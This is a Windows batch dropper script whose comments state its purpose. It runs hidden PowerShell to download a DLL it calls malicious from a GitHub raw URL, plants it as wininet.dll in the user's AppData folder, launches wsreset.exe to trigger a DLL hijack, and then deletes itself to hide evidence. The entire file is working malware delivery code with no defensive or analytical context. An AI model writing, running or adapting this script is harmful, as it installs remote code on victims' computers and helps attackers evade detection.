@echo off
REM Download the malicious wininet.dll and place it in the user's AppData folder
powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/wininet.dll' -OutFile '%APPDATA%\Microsoft\Windows\wininet.dll'"

REM Execute wsreset.exe to trigger the DLL hijack
start "" /B wsreset.exe

REM Delete the dropper script to hide evidence
del "%~f0"